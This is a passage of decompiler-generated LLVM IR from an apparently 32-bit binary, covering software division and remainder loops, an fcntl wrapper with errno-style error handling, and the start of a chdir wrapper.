  br i1 %v4_b600, label %bb78, label %dec_label_pc_b610thread-pre-split.loopexit.loopexit

bb78:                                             ; preds = %bb77
  %v2_b604 = and i32 %v0_b610.pr33100, 268435456
  %v3_b604 = icmp eq i32 %v2_b604, 0
  %v4_b604 = mul i32 %v0_b610.pr33100, 16
  br i1 %v3_b604, label %.thread1.thread9, label %dec_label_pc_b610.loopexit

.thread1.thread9:                                 ; preds = %bb78
  %v2_b60811 = add i32 %storemerge101, 4
  %v2_b5fc = icmp ugt i32 %v4_b604, 268435455
  br i1 %v2_b5fc, label %.thread, label %bb77

dec_label_pc_b610thread-pre-split.loopexit.loopexit: ; preds = %bb77
  br label %dec_label_pc_b610thread-pre-split.loopexit

dec_label_pc_b610thread-pre-split.loopexit:       ; preds = %dec_label_pc_b610thread-pre-split.loopexit.loopexit, %.thread
  %v0_b610.pr3398 = phi i32 [ %v0_b610.pr33.lcssa, %.thread ], [ %v0_b610.pr33100, %dec_label_pc_b610thread-pre-split.loopexit.loopexit ]
  %storemerge95 = phi i32 [ %storemerge.lcssa, %.thread ], [ %storemerge101, %dec_label_pc_b610thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_b610thread-pre-split

dec_label_pc_b610thread-pre-split:                ; preds = %.thread4, %dec_label_pc_b610thread-pre-split.loopexit
  %v1_b61c39 = phi i32 [ %storemerge95, %dec_label_pc_b610thread-pre-split.loopexit ], [ %v2_b61c, %.thread4 ]
  %v0_b610.pr = phi i32 [ %v0_b610.pr3398, %dec_label_pc_b610thread-pre-split.loopexit ], [ %v3_b618, %.thread4 ]
  br label %dec_label_pc_b610

dec_label_pc_b610.loopexit:                       ; preds = %bb78
  br label %dec_label_pc_b610

dec_label_pc_b610:                                ; preds = %dec_label_pc_b610.loopexit, %dec_label_pc_b610thread-pre-split
  %v0_b624.pr = phi i32 [ %v1_b61c39, %dec_label_pc_b610thread-pre-split ], [ %storemerge101, %dec_label_pc_b610.loopexit ]
  %v1_b618 = phi i32 [ %v0_b610.pr, %dec_label_pc_b610thread-pre-split ], [ %v4_b604, %dec_label_pc_b610.loopexit ]
  %v2_b610 = icmp slt i32 %v1_b618, 0
  br i1 %v2_b610, label %dec_label_pc_b624, label %bb79

bb79:                                             ; preds = %dec_label_pc_b610
  %v4_b614 = icmp ult i32 %v1_b618, %v1_b5e4
  br i1 %v4_b614, label %.thread4, label %dec_label_pc_b624

.thread4:                                         ; preds = %bb79
  %v3_b618 = mul i32 %v1_b618, 2
  %v2_b61c = add i32 %v0_b624.pr, 1
  br label %dec_label_pc_b610thread-pre-split

dec_label_pc_b624:                                ; preds = %bb79, %dec_label_pc_b610
  %v2_b624 = add i32 %v0_b624.pr, -3
  %v5_b628 = icmp slt i32 %v0_b624.pr, 3
  br i1 %v5_b628, label %dec_label_pc_b668, label %dec_label_pc_b62c

dec_label_pc_b62c:                                ; preds = %dec_label_pc_b624, %bb83
  %v6_b654 = phi i32 [ %v0_b65c, %bb83 ], [ %v2_b624, %dec_label_pc_b624 ]
  %v1_b630 = phi i32 [ %v1_b638.v6_b638.v6_b640.v6_b648, %bb83 ], [ %v1_b5e4, %dec_label_pc_b624 ]
  %v3_b65012 = phi i32 [ %v3_b650, %bb83 ], [ %v1_b618, %dec_label_pc_b624 ]
  %v3_b62c = icmp ult i32 %v1_b630, %v3_b65012
  %v3_b630 = select i1 %v3_b62c, i32 0, i32 %v3_b65012
  %v1_b638 = sub i32 %v1_b630, %v3_b630
  %v4_b634 = udiv i32 %v3_b65012, 2
  %v6_b634 = icmp ult i32 %v1_b638, %v4_b634
  %v6_b638 = select i1 %v6_b634, i32 0, i32 %v4_b634
  %v1_b638.v6_b638 = sub i32 %v1_b638, %v6_b638
  %.demorgan = and i1 %v3_b62c, %v6_b634
  %v4_b63c = udiv i32 %v3_b65012, 4
  %v6_b63c = icmp ult i32 %v1_b638.v6_b638, %v4_b63c
  %v6_b640 = select i1 %v6_b63c, i32 0, i32 %v4_b63c
  %v1_b638.v6_b638.v6_b640 = sub i32 %v1_b638.v6_b638, %v6_b640
  %.demorgan71 = and i1 %.demorgan, %v6_b63c
  %v4_b644 = udiv i32 %v3_b65012, 8
  %v6_b644 = icmp ult i32 %v1_b638.v6_b638.v6_b640, %v4_b644
  %v6_b648 = select i1 %v6_b644, i32 0, i32 %v4_b644
  %v1_b638.v6_b638.v6_b640.v6_b648 = sub i32 %v1_b638.v6_b638.v6_b640, %v6_b648
  %.demorgan72 = and i1 %.demorgan71, %v6_b644
  br i1 %.demorgan72, label %bb81, label %bb80

bb80:                                             ; preds = %dec_label_pc_b62c
  br label %bb81

bb81:                                             ; preds = %dec_label_pc_b62c, %bb80
  %v2_b64c = add i32 %v1_b638.v6_b638.v6_b640.v6_b648, -1
  %v4_b64c = sub i32 0, %v1_b638.v6_b638.v6_b640.v6_b648
  %v5_b64c = and i32 %v1_b638.v6_b638.v6_b640.v6_b648, %v4_b64c
  %v3_b650 = udiv i32 %v3_b65012, 16
  %v5_b654 = icmp slt i32 %v1_b638.v6_b638.v6_b640.v6_b648, 1
  br i1 %v5_b654, label %bb83, label %bb82

bb82:                                             ; preds = %bb81
  %v7_b654 = add i32 %v6_b654, -4
  %v9_b654 = sub i32 3, %v6_b654
  %v10_b654 = and i32 %v9_b654, %v6_b654
  br label %bb83

bb83:                                             ; preds = %bb81, %bb82
  %v0_b65c = phi i32 [ %v6_b654, %bb81 ], [ %v7_b654, %bb82 ]
  %v0_b65815.in = phi i32 [ %v2_b64c, %bb81 ], [ %v7_b654, %bb82 ]
  %v1_b65814.in = phi i32 [ %v5_b64c, %bb81 ], [ %v10_b654, %bb82 ]
  %v1_b65814 = icmp slt i32 %v1_b65814.in, 0
  %v0_b65815 = icmp slt i32 %v0_b65815.in, 0
  %v2_b658 = xor i1 %v0_b65815, %v1_b65814
  br i1 %v2_b658, label %dec_label_pc_b65c, label %dec_label_pc_b62c

dec_label_pc_b65c:                                ; preds = %bb83
  %v1_b65c = urem i32 %v0_b65c, 4
  %v2_b65c = icmp eq i32 %v1_b65c, 0
  br i1 %v2_b65c, label %bb76, label %bb84

bb84:                                             ; preds = %dec_label_pc_b65c
  %v3_b660 = icmp eq i32 %v1_b638.v6_b638.v6_b640.v6_b648, 0
  br i1 %v3_b660, label %bb76, label %dec_label_pc_b668

dec_label_pc_b668:                                ; preds = %bb84, %dec_label_pc_b624
  %v0_b67c = phi i32 [ %v3_b650, %bb84 ], [ %v1_b618, %dec_label_pc_b624 ]
  %v1_b678 = phi i32 [ %v1_b638.v6_b638.v6_b640.v6_b648, %bb84 ], [ %v1_b5e4, %dec_label_pc_b624 ]
  %v0_b668 = phi i32 [ %v0_b65c, %bb84 ], [ %v2_b624, %dec_label_pc_b624 ]
  %v5_b66c = icmp slt i32 %v0_b668, -2
  br i1 %v5_b66c, label %dec_label_pc_b68c, label %dec_label_pc_b670

dec_label_pc_b670:                                ; preds = %dec_label_pc_b668
  %v8_b668 = icmp eq i32 %v0_b668, -2
  br i1 %v8_b668, label %dec_label_pc_b680, label %dec_label_pc_b674

dec_label_pc_b674:                                ; preds = %dec_label_pc_b670
  %v3_b674 = icmp ult i32 %v1_b678, %v0_b67c
  br i1 %v3_b674, label %bb86, label %bb85

bb85:                                             ; preds = %dec_label_pc_b674
  %v2_b674 = sub i32 %v1_b678, %v0_b67c
  br label %bb86

bb86:                                             ; preds = %dec_label_pc_b674, %bb85
  %v0_b68052 = phi i32 [ %v1_b678, %dec_label_pc_b674 ], [ %v2_b674, %bb85 ]
  %v3_b67c = udiv i32 %v0_b67c, 2
  br label %dec_label_pc_b680

dec_label_pc_b680:                                ; preds = %dec_label_pc_b670, %bb86
  %v0_b688 = phi i32 [ %v0_b67c, %dec_label_pc_b670 ], [ %v3_b67c, %bb86 ]
  %v1_b684 = phi i32 [ %v1_b678, %dec_label_pc_b670 ], [ %v0_b68052, %bb86 ]
  %v3_b680 = icmp ult i32 %v1_b684, %v0_b688
  br i1 %v3_b680, label %bb88, label %bb87

bb87:                                             ; preds = %dec_label_pc_b680
  %v2_b680 = sub i32 %v1_b684, %v0_b688
  br label %bb88

bb88:                                             ; preds = %dec_label_pc_b680, %bb87
  %v0_b68c55 = phi i32 [ %v1_b684, %dec_label_pc_b680 ], [ %v2_b680, %bb87 ]
  %v3_b688 = udiv i32 %v0_b688, 2
  br label %dec_label_pc_b68c

dec_label_pc_b68c:                                ; preds = %dec_label_pc_b668, %bb88
  %v2_b690 = phi i32 [ %v0_b67c, %dec_label_pc_b668 ], [ %v3_b688, %bb88 ]
  %v1_b690 = phi i32 [ %v1_b678, %dec_label_pc_b668 ], [ %v0_b68c55, %bb88 ]
  %v3_b68c = icmp ult i32 %v1_b690, %v2_b690
  br i1 %v3_b68c, label %bb76, label %bb89

bb89:                                             ; preds = %dec_label_pc_b68c
  %v2_b68c = sub i32 %v1_b690, %v2_b690
  br label %bb76

dec_label_pc_b698:                                ; preds = %dec_label_pc_b5dc
  %v0_b698 = load i32, i32* @lr, align 4
  %v0_b69c = call i32 @function_b78c()
  call void @__pseudo_branch(i32 %v0_b698)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_b690, { 1, 2, 0 }
  uselistorder i32 %v0_b67c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_b65c, { 1, 0, 2 }
  uselistorder i32 %v7_b654, { 1, 0 }
  uselistorder i32 %v3_b650, { 1, 0 }
  uselistorder i32 %v1_b638.v6_b638.v6_b640.v6_b648, { 1, 2, 7, 5, 6, 4, 0, 3 }
  uselistorder i32 %v4_b644, { 1, 0 }
  uselistorder i32 %v4_b63c, { 1, 0 }
  uselistorder i32 %v4_b634, { 1, 0 }
  uselistorder i32 %v6_b654, { 3, 0, 2, 1 }
  uselistorder i32 %v2_b624, { 1, 0 }
  uselistorder i32 %v1_b618, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v4_b604, { 1, 0, 3, 2 }
  uselistorder i32 %v0_b610.pr33100, { 1, 0, 2, 3 }
  uselistorder i32 %v1_b5e4, { 4, 1, 5, 3, 0, 2, 6, 7 }
  uselistorder i32 %arg2, { 7, 8, 6, 5, 3, 4, 0, 2, 1 }
  uselistorder label %dec_label_pc_b68c, { 1, 0 }
  uselistorder label %bb88, { 1, 0 }
  uselistorder label %dec_label_pc_b680, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %bb83, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %dec_label_pc_b62c, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
  uselistorder label %bb76, { 2, 0, 3, 4, 5, 1 }
  uselistorder label %.thread65, { 1, 0 }
}

define i32 @function_b6a8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_b6a8:
  store i32 %arg1, i32* @r0, align 4
  %v2_b6a8 = icmp eq i32 %arg2, 0
  br i1 %v2_b6a8, label %dec_label_pc_b77c, label %dec_label_pc_b6b0

dec_label_pc_b6b0:                                ; preds = %dec_label_pc_b6a8
  %v1_b6a8 = icmp slt i32 %arg2, 0
  br i1 %v1_b6a8, label %bb, label %bb79

bb:                                               ; preds = %dec_label_pc_b6b0
  %v2_b6b0 = sub i32 0, %arg2
  br label %bb79

bb79:                                             ; preds = %dec_label_pc_b6b0, %bb
  %v4_b6c8 = phi i32 [ %arg2, %dec_label_pc_b6b0 ], [ %v2_b6b0, %bb ]
  %v0_b6b4 = load i32, i32* @r0, align 4
  %v1_b6b4 = icmp slt i32 %v0_b6b4, 0
  br i1 %v1_b6b4, label %bb80, label %bb81

bb80:                                             ; preds = %bb79
  %v2_b6b8 = sub i32 0, %v0_b6b4
  br label %bb81

bb81:                                             ; preds = %bb79, %bb80
  %v1_b6c0 = phi i32 [ %v0_b6b4, %bb79 ], [ %v2_b6b8, %bb80 ]
  %v1_b6bc = add i32 %v4_b6c8, -1
  %v7_b6bc = icmp eq i32 %v4_b6c8, 1
  br i1 %v7_b6bc, label %.thread70, label %bb82

bb82:                                             ; preds = %bb81
  %v10_b6c0 = icmp eq i32 %v1_b6c0, %v4_b6c8
  br i1 %v10_b6c0, label %.thread70, label %bb83

.thread70:                                        ; preds = %bb81, %bb82
  br label %.thread72

bb83:                                             ; preds = %bb82
  %v4_b6c0 = icmp ult i32 %v1_b6c0, %v4_b6c8
  br i1 %v4_b6c0, label %.thread6, label %bb84

bb84:                                             ; preds = %bb83
  %v6_b6c8 = and i32 %v1_b6bc, %v4_b6c8
  %v8_b6c8 = icmp eq i32 %v6_b6c8, 0
  br i1 %v8_b6c8, label %.thread72, label %dec_label_pc_b6d8.preheader

dec_label_pc_b6d8.preheader:                      ; preds = %bb84
  %v2_b6d8109 = icmp ugt i32 %v4_b6c8, 268435455
  br i1 %v2_b6d8109, label %.thread1, label %bb85

.thread72:                                        ; preds = %bb84, %.thread70
  %v1_b6cc64 = phi i32 [ %v1_b6c0, %bb84 ], [ 0, %.thread70 ]
  %v3_b6cc = and i32 %v1_b6cc64, %v1_b6bc
  br label %.thread6

.thread1:                                         ; preds = %.thread2.thread7, %dec_label_pc_b6d8.preheader
  %v0_b6ec.pr35.lcssa = phi i32 [ %v4_b6c8, %dec_label_pc_b6d8.preheader ], [ %v4_b6e0, %.thread2.thread7 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_b6d8.preheader ], [ %v2_b6e49, %.thread2.thread7 ]
  br label %dec_label_pc_b6ecthread-pre-split.loopexit

bb85:                                             ; preds = %dec_label_pc_b6d8.preheader, %.thread2.thread7
  %storemerge111 = phi i32 [ %v2_b6e49, %.thread2.thread7 ], [ 0, %dec_label_pc_b6d8.preheader ]
  %v0_b6ec.pr35110 = phi i32 [ %v4_b6e0, %.thread2.thread7 ], [ %v4_b6c8, %dec_label_pc_b6d8.preheader ]
  %v4_b6dc = icmp ult i32 %v0_b6ec.pr35110, %v1_b6c0
  br i1 %v4_b6dc, label %bb86, label %dec_label_pc_b6ecthread-pre-split.loopexit.loopexit

bb86:                                             ; preds = %bb85
  %v2_b6e0 = and i32 %v0_b6ec.pr35110, 268435456
  %v3_b6e0 = icmp eq i32 %v2_b6e0, 0
  %v4_b6e0 = mul i32 %v0_b6ec.pr35110, 16
  br i1 %v3_b6e0, label %.thread2.thread7, label %dec_label_pc_b6ec.loopexit

.thread2.thread7:                                 ; preds = %bb86
  %v2_b6e49 = add i32 %storemerge111, 4
  %v2_b6d8 = icmp ugt i32 %v4_b6e0, 268435455
  br i1 %v2_b6d8, label %.thread1, label %bb85

dec_label_pc_b6ecthread-pre-split.loopexit.loopexit: ; preds = %bb85
  br label %dec_label_pc_b6ecthread-pre-split.loopexit

dec_label_pc_b6ecthread-pre-split.loopexit:       ; preds = %dec_label_pc_b6ecthread-pre-split.loopexit.loopexit, %.thread1
  %v0_b6ec.pr35108 = phi i32 [ %v0_b6ec.pr35.lcssa, %.thread1 ], [ %v0_b6ec.pr35110, %dec_label_pc_b6ecthread-pre-split.loopexit.loopexit ]
  %storemerge105 = phi i32 [ %storemerge.lcssa, %.thread1 ], [ %storemerge111, %dec_label_pc_b6ecthread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_b6ecthread-pre-split

dec_label_pc_b6ecthread-pre-split:                ; preds = %.thread4, %dec_label_pc_b6ecthread-pre-split.loopexit
  %v1_b6f841 = phi i32 [ %storemerge105, %dec_label_pc_b6ecthread-pre-split.loopexit ], [ %v2_b6f8, %.thread4 ]
  %v2_b6f036 = phi i32 [ %v1_b6c0, %dec_label_pc_b6ecthread-pre-split.loopexit ], [ %v2_b6f0, %.thread4 ]
  %v0_b6ec.pr = phi i32 [ %v0_b6ec.pr35108, %dec_label_pc_b6ecthread-pre-split.loopexit ], [ %v3_b6f4, %.thread4 ]
  br label %dec_label_pc_b6ec

dec_label_pc_b6ec.loopexit:                       ; preds = %bb86
  br label %dec_label_pc_b6ec

dec_label_pc_b6ec:                                ; preds = %dec_label_pc_b6ec.loopexit, %dec_label_pc_b6ecthread-pre-split
  %v0_b700.pr = phi i32 [ %v1_b6f841, %dec_label_pc_b6ecthread-pre-split ], [ %storemerge111, %dec_label_pc_b6ec.loopexit ]
  %v2_b6f0 = phi i32 [ %v2_b6f036, %dec_label_pc_b6ecthread-pre-split ], [ %v1_b6c0, %dec_label_pc_b6ec.loopexit ]
  %v1_b6f4 = phi i32 [ %v0_b6ec.pr, %dec_label_pc_b6ecthread-pre-split ], [ %v4_b6e0, %dec_label_pc_b6ec.loopexit ]
  %v2_b6ec = icmp slt i32 %v1_b6f4, 0
  br i1 %v2_b6ec, label %dec_label_pc_b700, label %bb87

bb87:                                             ; preds = %dec_label_pc_b6ec
  %v4_b6f0 = icmp ult i32 %v1_b6f4, %v2_b6f0
  br i1 %v4_b6f0, label %.thread4, label %dec_label_pc_b700

.thread4:                                         ; preds = %bb87
  %v3_b6f4 = mul i32 %v1_b6f4, 2
  %v2_b6f8 = add i32 %v0_b700.pr, 1
  br label %dec_label_pc_b6ecthread-pre-split

dec_label_pc_b700:                                ; preds = %bb87, %dec_label_pc_b6ec
  %v2_b700 = add i32 %v0_b700.pr, -3
  %v5_b704 = icmp slt i32 %v0_b700.pr, 3
  br i1 %v5_b704, label %dec_label_pc_b744, label %dec_label_pc_b708

dec_label_pc_b708:                                ; preds = %dec_label_pc_b700, %bb91
  %v6_b730 = phi i32 [ %v0_b738, %bb91 ], [ %v2_b700, %dec_label_pc_b700 ]
  %v1_b70c = phi i32 [ %v1_b714.v6_b714.v6_b71c.v6_b724, %bb91 ], [ %v2_b6f0, %dec_label_pc_b700 ]
  %v3_b72c10 = phi i32 [ %v3_b72c, %bb91 ], [ %v1_b6f4, %dec_label_pc_b700 ]
  %v3_b708 = icmp ult i32 %v1_b70c, %v3_b72c10
  %v3_b70c = select i1 %v3_b708, i32 0, i32 %v3_b72c10
  %v1_b714 = sub i32 %v1_b70c, %v3_b70c
  %v4_b710 = udiv i32 %v3_b72c10, 2
  %v6_b710 = icmp ult i32 %v1_b714, %v4_b710
  %v6_b714 = select i1 %v6_b710, i32 0, i32 %v4_b710
  %v1_b714.v6_b714 = sub i32 %v1_b714, %v6_b714
  %.demorgan = and i1 %v3_b708, %v6_b710
  %v4_b718 = udiv i32 %v3_b72c10, 4
  %v6_b718 = icmp ult i32 %v1_b714.v6_b714, %v4_b718
  %v6_b71c = select i1 %v6_b718, i32 0, i32 %v4_b718
  %v1_b714.v6_b714.v6_b71c = sub i32 %v1_b714.v6_b714, %v6_b71c
  %.demorgan76 = and i1 %.demorgan, %v6_b718
  %v4_b720 = udiv i32 %v3_b72c10, 8
  %v6_b720 = icmp ult i32 %v1_b714.v6_b714.v6_b71c, %v4_b720
  %v6_b724 = select i1 %v6_b720, i32 0, i32 %v4_b720
  %v1_b714.v6_b714.v6_b71c.v6_b724 = sub i32 %v1_b714.v6_b714.v6_b71c, %v6_b724
  %.demorgan77 = and i1 %.demorgan76, %v6_b720
  br i1 %.demorgan77, label %bb89, label %bb88

bb88:                                             ; preds = %dec_label_pc_b708
  br label %bb89

bb89:                                             ; preds = %dec_label_pc_b708, %bb88
  %v2_b728 = add i32 %v1_b714.v6_b714.v6_b71c.v6_b724, -1
  %v4_b728 = sub i32 0, %v1_b714.v6_b714.v6_b71c.v6_b724
  %v5_b728 = and i32 %v1_b714.v6_b714.v6_b71c.v6_b724, %v4_b728
  %v3_b72c = udiv i32 %v3_b72c10, 16
  %v5_b730 = icmp slt i32 %v1_b714.v6_b714.v6_b71c.v6_b724, 1
  br i1 %v5_b730, label %bb91, label %bb90

bb90:                                             ; preds = %bb89
  %v7_b730 = add i32 %v6_b730, -4
  %v9_b730 = sub i32 3, %v6_b730
  %v10_b730 = and i32 %v9_b730, %v6_b730
  br label %bb91

bb91:                                             ; preds = %bb89, %bb90
  %v0_b738 = phi i32 [ %v6_b730, %bb89 ], [ %v7_b730, %bb90 ]
  %v0_b73413.in = phi i32 [ %v2_b728, %bb89 ], [ %v7_b730, %bb90 ]
  %v1_b73412.in = phi i32 [ %v5_b728, %bb89 ], [ %v10_b730, %bb90 ]
  %v1_b73412 = icmp slt i32 %v1_b73412.in, 0
  %v0_b73413 = icmp slt i32 %v0_b73413.in, 0
  %v2_b734 = xor i1 %v0_b73413, %v1_b73412
  br i1 %v2_b734, label %dec_label_pc_b738, label %dec_label_pc_b708

dec_label_pc_b738:                                ; preds = %bb91
  %v1_b738 = urem i32 %v0_b738, 4
  %v2_b738 = icmp eq i32 %v1_b738, 0
  br i1 %v2_b738, label %.thread6, label %bb92

bb92:                                             ; preds = %dec_label_pc_b738
  %v3_b73c = icmp eq i32 %v1_b714.v6_b714.v6_b71c.v6_b724, 0
  br i1 %v3_b73c, label %.thread6, label %dec_label_pc_b744

dec_label_pc_b744:                                ; preds = %bb92, %dec_label_pc_b700
  %v0_b758 = phi i32 [ %v3_b72c, %bb92 ], [ %v1_b6f4, %dec_label_pc_b700 ]
  %v1_b754 = phi i32 [ %v1_b714.v6_b714.v6_b71c.v6_b724, %bb92 ], [ %v2_b6f0, %dec_label_pc_b700 ]
  %v0_b744 = phi i32 [ %v0_b738, %bb92 ], [ %v2_b700, %dec_label_pc_b700 ]
  %v5_b748 = icmp slt i32 %v0_b744, -2
  br i1 %v5_b748, label %dec_label_pc_b768, label %dec_label_pc_b74c

dec_label_pc_b74c:                                ; preds = %dec_label_pc_b744
  %v8_b744 = icmp eq i32 %v0_b744, -2
  br i1 %v8_b744, label %dec_label_pc_b75c, label %dec_label_pc_b750

dec_label_pc_b750:                                ; preds = %dec_label_pc_b74c
  %v3_b750 = icmp ult i32 %v1_b754, %v0_b758
  br i1 %v3_b750, label %bb94, label %bb93

bb93:                                             ; preds = %dec_label_pc_b750
  %v2_b750 = sub i32 %v1_b754, %v0_b758
  br label %bb94

bb94:                                             ; preds = %dec_label_pc_b750, %bb93
  %v0_b75c54 = phi i32 [ %v1_b754, %dec_label_pc_b750 ], [ %v2_b750, %bb93 ]
  %v3_b758 = udiv i32 %v0_b758, 2
  br label %dec_label_pc_b75c

dec_label_pc_b75c:                                ; preds = %dec_label_pc_b74c, %bb94
  %v0_b764 = phi i32 [ %v0_b758, %dec_label_pc_b74c ], [ %v3_b758, %bb94 ]
  %v1_b760 = phi i32 [ %v1_b754, %dec_label_pc_b74c ], [ %v0_b75c54, %bb94 ]
  %v3_b75c = icmp ult i32 %v1_b760, %v0_b764
  br i1 %v3_b75c, label %bb96, label %bb95

bb95:                                             ; preds = %dec_label_pc_b75c
  %v2_b75c = sub i32 %v1_b760, %v0_b764
  br label %bb96

bb96:                                             ; preds = %dec_label_pc_b75c, %bb95
  %v0_b76857 = phi i32 [ %v1_b760, %dec_label_pc_b75c ], [ %v2_b75c, %bb95 ]
  %v3_b764 = udiv i32 %v0_b764, 2
  br label %dec_label_pc_b768

dec_label_pc_b768:                                ; preds = %dec_label_pc_b744, %bb96
  %v2_b76c = phi i32 [ %v0_b758, %dec_label_pc_b744 ], [ %v3_b764, %bb96 ]
  %v1_b76c = phi i32 [ %v1_b754, %dec_label_pc_b744 ], [ %v0_b76857, %bb96 ]
  %v3_b768 = icmp ult i32 %v1_b76c, %v2_b76c
  br i1 %v3_b768, label %.thread6, label %bb97

bb97:                                             ; preds = %dec_label_pc_b768
  %v2_b768 = sub i32 %v1_b76c, %v2_b76c
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_b768, %bb83, %.thread72, %dec_label_pc_b738, %bb92, %bb97
  %v1_b774 = phi i32 [ %v1_b714.v6_b714.v6_b71c.v6_b724, %dec_label_pc_b738 ], [ 0, %bb92 ], [ %v1_b76c, %dec_label_pc_b768 ], [ %v2_b768, %bb97 ], [ %v3_b6cc, %.thread72 ], [ %v1_b6c0, %bb83 ]
  br i1 %v1_b6b4, label %bb98, label %bb99

bb98:                                             ; preds = %.thread6
  %v2_b774 = sub i32 0, %v1_b774
  br label %bb99

bb99:                                             ; preds = %.thread6, %bb98
  %v1_b778 = phi i32 [ %v1_b774, %.thread6 ], [ %v2_b774, %bb98 ]
  ret i32 %v1_b778

dec_label_pc_b77c:                                ; preds = %dec_label_pc_b6a8
  %v0_b77c = load i32, i32* @lr, align 4
  %v0_b780 = call i32 @function_b78c()
  call void @__pseudo_branch(i32 %v0_b77c)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_b758, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_b738, { 1, 0, 2 }
  uselistorder i32 %v7_b730, { 1, 0 }
  uselistorder i32 %v3_b72c, { 1, 0 }
  uselistorder i32 %v1_b714.v6_b714.v6_b71c.v6_b724, { 0, 1, 2, 7, 5, 6, 4, 3 }
  uselistorder i32 %v4_b720, { 1, 0 }
  uselistorder i32 %v4_b718, { 1, 0 }
  uselistorder i32 %v4_b710, { 1, 0 }
  uselistorder i32 %v6_b730, { 3, 0, 2, 1 }
  uselistorder i32 %v2_b700, { 1, 0 }
  uselistorder i32 %v1_b6f4, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v2_b6f0, { 1, 0, 3, 2 }
  uselistorder i32 %v4_b6e0, { 1, 0, 3, 2 }
  uselistorder i32 %v0_b6ec.pr35110, { 1, 0, 2, 3 }
  uselistorder i32 %v1_b6c0, { 0, 2, 3, 1, 4, 6, 5 }
  uselistorder i32 %v4_b6c8, { 1, 0, 2, 3, 5, 4, 6, 7 }
  uselistorder i32 ()* @function_b78c, { 2, 1, 0 }
  uselistorder i32 268435455, { 2, 0, 3, 1, 4 }
  uselistorder i32 %arg2, { 3, 2, 1, 0 }
  uselistorder label %bb99, { 1, 0 }
  uselistorder label %.thread6, { 5, 0, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_b768, { 1, 0 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_b75c, { 1, 0 }
  uselistorder label %bb94, { 1, 0 }
  uselistorder label %bb91, { 1, 0 }
  uselistorder label %bb89, { 1, 0 }
  uselistorder label %dec_label_pc_b708, { 1, 0 }
  uselistorder label %bb85, { 1, 0 }
  uselistorder label %.thread70, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
}

define i32 @function_b78c() local_unnamed_addr {
dec_label_pc_b78c:
  %v1_b78c = load i32, i32* @r0, align 4
  ret i32 %v1_b78c
}

define i32 @function_b790(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_b790:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %v6_b790 = load i32, i32* @r2, align 4
  %v1_b7a0 = add i32 %arg2, -12
  store i32 %v6_b790, i32* @r3, align 4
  %tmp = icmp ugt i32 %v1_b7a0, 2
  br i1 %tmp, label %dec_label_pc_b7c8, label %dec_label_pc_b7c0

dec_label_pc_b7c0:                                ; preds = %dec_label_pc_b790
  %v0_b7c0 = call i32 @function_b804()
  br label %dec_label_pc_b7f4

dec_label_pc_b7c8:                                ; preds = %dec_label_pc_b790
  %v2_b7d0 = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 %arg2)
  store i32 %v2_b7d0, i32* %r4.global-to-local, align 4
  %tmp8 = icmp ult i32 %v2_b7d0, -4095
  br i1 %tmp8, label %dec_label_pc_b7f4, label %dec_label_pc_b7e0

dec_label_pc_b7e0:                                ; preds = %dec_label_pc_b7c8
  %v0_b7e0 = call i32 @function_bdd4()
  %v0_b7e4 = load i32, i32* %r4.global-to-local, align 4
  %v1_b7e4 = sub i32 0, %v0_b7e4
  %v2_b7e8 = inttoptr i32 %v0_b7e0 to i32*
  store i32 %v1_b7e4, i32* %v2_b7e8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_b7f4

dec_label_pc_b7f4:                                ; preds = %dec_label_pc_b7e0, %dec_label_pc_b7c8, %dec_label_pc_b7c0
  %storemerge = phi i32 [ %v0_b7c0, %dec_label_pc_b7c0 ], [ %v2_b7d0, %dec_label_pc_b7c8 ], [ -1, %dec_label_pc_b7e0 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_b7d0, { 1, 0, 2 }
}

define i32 @function_b804() local_unnamed_addr {
dec_label_pc_b804:
  %r4.global-to-local = alloca i32, align 4
  %v0_b824 = load i32, i32* @r0, align 4
  store i32 %v0_b824, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_b824, -4095
  br i1 %tmp, label %dec_label_pc_b840, label %dec_label_pc_b830

dec_label_pc_b830:                                ; preds = %dec_label_pc_b804
  %v0_b830 = call i32 @function_bdd4()
  %v0_b834 = load i32, i32* %r4.global-to-local, align 4
  %v1_b834 = sub i32 0, %v0_b834
  %v2_b838 = inttoptr i32 %v0_b830 to i32*
  store i32 %v1_b834, i32* %v2_b838, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_b840

dec_label_pc_b840:                                ; preds = %dec_label_pc_b804, %dec_label_pc_b830
  %v0_b840 = phi i32 [ %v0_b824, %dec_label_pc_b804 ], [ -1, %dec_label_pc_b830 ]
  ret i32 %v0_b840

; uselistorder directives
  uselistorder i32 %v0_b824, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b840, { 1, 0 }
}

define i32 @function_b854(i8* %arg1) local_unnamed_addr {
dec_label_pc_b854:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_b854 = load i32, i32* @r4, align 4
  store i32 %v3_b854, i32* %stack_var_-8, align 4
  %v3_b858 = call i32 @chdir(i8* %arg1)
  store i32 %v3_b858, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v3_b858, -4095
  br i1 %tmp, label %dec_label_pc_b878, label %dec_label_pc_b868

dec_label_pc_b868:                                ; preds = %dec_label_pc_b854
